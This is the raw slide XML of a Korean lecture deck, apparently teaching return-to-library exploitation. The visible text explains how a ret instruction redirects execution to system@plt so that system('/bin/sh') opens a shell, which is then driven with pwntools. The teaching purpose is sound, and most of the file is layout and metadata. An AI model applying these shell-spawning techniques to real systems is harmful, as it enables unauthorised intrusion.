              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>있어야하기</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 때문입니다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, (0x8 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>은 안됨</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939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6C90C0-FC04-4B28-A46C-19BD1D506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1" y="2732257"/>
            <a:ext cx="5424917" cy="27802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F5078F6-1034-C721-C5DA-9C6F55210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6296"/>
            <a:ext cx="5903469" cy="500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57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5B65B-E73E-2D3B-5A30-9CE71F9E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EF4421-6CB1-5694-9000-C96A8D80DB5F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3DC3B-A7AD-87DF-3E78-1B208E4FE349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6A26F-41D8-FE2E-007F-C308076EEF2A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7FF1C4-E9E9-1C33-A588-6203E75D110B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1406731"/>
            <a:ext cx="78359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3. ret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pop rip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를 하면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rsp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>의 값이 현재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system@plt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이므로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system@plt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함수를 호출하게 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ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>이제 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system(“/bin/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</a:rPr>
              <a:t>”) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>가 실행되고 쉘이 실행됩니다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40C246D-B3FF-D1C8-34E5-FD679F8F3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893" y="2648638"/>
            <a:ext cx="4913131" cy="30984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A0FC9CB-CA0E-BF98-E7E1-55B9E096F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87" y="2648638"/>
            <a:ext cx="5705613" cy="309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1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CBDE2-1343-A491-DB74-F50BD4FCC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C473A45-FD61-F2E3-59FA-62DAAC9231F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="1076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A7D85-8D24-9FFE-FF0F-D7C9D4EB8B42}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="268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spc="-3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to Library</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="3600" spc="-3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5408C-6C15-B044-63AF-20B618BCF68F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="117305"/>
            <a:ext cx="770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Part 5, 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3895D-6FF7-26C7-27B4-7E711A87A376}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1406731"/>
            <a:ext cx="11511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ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4.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pwntools</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 코드에서 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io.interactive</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>통해 실행된 쉘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(“/bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>”)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>과 상호작용을 할 수 있습니다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr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3AC3720-35E8-77BD-B63F-E42BDACE4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445" y="2336666"/>
            <a:ext cx="714375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08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1AEC5A-5830-454D-8939-8073E476BB27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2854221" y="295194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2800" i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85FF8-1E79-ABB4-D287-036BD71FF368}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4233696" y="2644170"/>
            <a:ext cx="37246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ko-KR" altLang="en-US" sz="9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9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ko-KR" altLang="en-US" sz="9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9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ko-KR" altLang="en-US" sz="9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83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20009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3252"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="005289"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="007095"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="BCDEE3"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="418A9D"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="AEAFA9"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="393939"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="393939"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="나눔스퀘어 Light">
      <a:majorFont>
        <a:latin typeface="나눔스퀘어 ExtraBold"/>
        <a:ea typeface="나눔스퀘어 ExtraBold"/>
        <a:cs typeface=""/>
      </a:majorFont>
      <a:minorFont>
        <a:latin typeface="나눔스퀘어 Light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11507</TotalTime>
  <Words>4999</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>와이드스크린</PresentationFormat>
  <Paragraphs>713</Paragraphs>
  <Slides>63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1" baseType="lpstr">
      <vt:lpstr>나눔스퀘어 ExtraBold</vt:lpstr>
      <vt:lpstr>나눔스퀘어 Light</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Arial Nova Light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심현호</cp:lastModifiedBy>
  <cp:revision>549</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-09-07T02:34:06Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-18T09:43:55Z</dcterms:modified>
</cp:coreProperties>
</file>